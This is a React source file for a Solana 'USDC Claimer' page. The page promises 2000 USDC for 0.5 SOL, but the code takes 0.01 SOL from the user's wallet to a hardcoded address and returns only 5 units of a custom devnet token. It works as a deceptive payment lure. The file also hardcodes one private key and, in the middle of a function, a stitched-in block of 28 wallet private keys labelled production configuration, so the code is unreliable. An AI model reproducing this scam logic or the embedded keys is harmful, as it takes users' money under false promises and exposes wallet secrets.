/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3KeqnMF9T7HjhtQaSi67VyFapDbLD2AStfQsvBc3kct6VWh5tPoXHscBDKqRJRTeheSVJn5QUMeJVnCWTPfDe5jw"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5yRPLxY4vkWeyKDA6jPCwCue5bjRXZvef9EkNqGBuxYr5S3o82nak43vwxDAGApVLwUofD5TNqQ1B231Sqob1JYW",
  "key1": "3TpfebK2W44PVwMpqbus5MdHDh8Z2NkmGs26AoEUiJzsBCmiZGr8HMffBoVepysW6FQW1pkjYSUZWgvGeeL4Y7a7",
  "key2": "65sdfs3wUTP8JcCR8xsnHQFDfp3ccAsLMdNbKgTkDcjwuBJJqUexHtyWXJwby4ra1M6qX4JuzT1dGt5bymEzxs1S",
  "key3": "5Pev1F7xtW4wPaBeGj5wtH4FGy85W1KQ9AY3jALzQCDrXVfHZPQAr93dZgYvkcDbMqYA6XifyoCYchzxEWhMwwJT",
  "key4": "4a26JgpvnQW9cCVj9X4zEAH1GRUDKajWH4nRoDVcLaUH18v3a64tmNnmvYmGh6TvRVZjSEY2241W3gFzoioYKp1a",
  "key5": "3zL1bPkN3NBftv5BdBcFx9xwjrHyrSN9hjfPpXqDKWKQyL3s1QxwGpkNDiaMecA5XZwhjF92uzfZ3jNHaE9pR1Hb",
  "key6": "f7jaykbS1fLg59k2EegwzDgxRDaFYaJzxHxxp3tQxHbBo8u2uqQnCowygKRgQ7ZrKmEJSq2ccZ1aKFA78rYpZff",
  "key7": "4oWHiz2SGmMThbU83iQmJKksC9QG2yh98wJ1Q12inBHLmw4CUp6Z1kip43fafdCVMqiAMfePtGXPieS1vvJTZJpf",
  "key8": "5GZXqjHGpF7HX2xk2LGRPomJobyyYheTiQftmTd8u5aAiKxr3cQhekBF3pxPr5q8XVkjfF1smduvwx9szLLgbJKy",
  "key9": "4VerSs32vgRXoPKRGCcyL6kYaXgrayXhrABdYFJFw29LVEBGJ39Fu9ASeGszyw94AYfoWd4DDdYS2j19a48DwTLc",
  "key10": "2FUNBNPPyi3ZmmDi8jzt8w1ypgmVh8igr22ja5j7Kg8Yd5hBj5iU2NT6BjsKDmCGRV1QrkxGnahLr1hnrCJc5NZv",
  "key11": "5TDjg5K6TBdHdvUGr2avh2ajh3G9TnZrgy73rHDPHr3QAPsf7BnyDi1TG37EnndWf86hyetCkurf4J8srRSaF4qJ",
  "key12": "53vJndvYV2bhg492XrF9QuKWPZS5AJBVTZPSiFhPZNHGKuDCxKJnekqP7QLotarardTWC25nDEkMTuCZmDFLR1Zg",
  "key13": "4Vk3r15CBixfShpc86ny8WnDZjjWui9AeubL3954Q4ZtdqhDXu3NGeetMcVTHCH3F5TX7dzcoE3o6ememKZhtbqV",
  "key14": "4aKFtemyYNH44urqg4RNoL31ELhsrW3Aw69fB23oZckbteEmFzhiNmjXxQaGRnm9ZD6kTzy2syfacPuC7H5aDJ9D",
  "key15": "3avAP2T2Ut2wckoKWGXMSzF39vTyuBwZ5ZK2NdS9jRKZrAkJHMQHZAmzURnaW489YUW2wKtS2jT6DzNGSmzvqBuu",
  "key16": "u71DobEfS71nKRLK7k8nZRd9r7rGq7581KErdTaReXsui8exFW1MHeu8BtQ7kZ4925B1kCRpFu9QPRASQec6mae",
  "key17": "2ur4aZKWSz3EcbyM3APfuyDGhp9r7YN3foa2xaFkiWEpEDuYujXjeLPC8f3ichCoHRUZjL5VZptHNe9aBdBGcVXM",
  "key18": "5PKG51h9D43aHT1gFGAcHow8Qusziqy1Zxyu1drsq531v2jHscpwhBf9Dx4kX4x6ADJUxwvm97MTGPUNApJ8Cryz",
  "key19": "2JbFsm2u7bB1gk7TSv2BnwJd7oTv4Eghh1f7VGCGMiGMTAZLyfCe4zrDfWHDsMXrxqYrcutctN6pY1QgT6MMis3K",
  "key20": "5PZedGidoC6kx5VhHHxyXXgeQZAgfQhDjNPUjG3QXq5a7BGFc5ge3YA3SKBf4E3y8ejcYXyaacQTvXWGEgsQUirN",
  "key21": "5DTWcATLWNS1ibexr6fbrY2z3ugY4sMsuDCRf9U5nKM87uihtExx8cKesNeQwKZAoaufFXPkmkaD12hqR3PKXuWv",
  "key22": "5UVoDwEtnjtZy9AFqugJ4ACxJ4b44b2XXKBmQwLd91dM3FgG1S7QPGRbhBytRfBcnZBupBxnwQmez2Ku2oZDY75J",
  "key23": "6hLrPmTGMavxT9ykf2k7WGJ74qRoy5iYe95eLTgtdL9RpDrCUZ8LvJpFDBpUs6cFFnU3XVEUgUMzJDDoDGy71nz",
  "key24": "P2DhiF45ndZhLWKKYgBSkdLyBGXxGG44e6ra9tpNKRi9sMLz5nCo2RTwGAzpg5KofH7Yn1wUy6kyZ3iNjCuUe9e",
  "key25": "5zHTFkPyUFVvqhtcyF2LamJRuLMQtoeVue6QNxFucwCCVAYCqfCtomnjekfWTyfozP49fDSN12ei39wcktfpyBCg",
  "key26": "4S2LW77K4YYW3AY8HNgJL8KG1mReVdrbmFgASXGqD4RJmzwydhfrgmorHLK3Tzs6GDmV1xBRfJkHaS8dhBgYFtQq",
  "key27": "YtraifzCVS8Z6NMeHnWMjRH82trUKfDa5LwUaWjYXnF9zEf18zkiRNgreQ6KsPuWJGFHStyUguoQAyaqd92aAAT"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
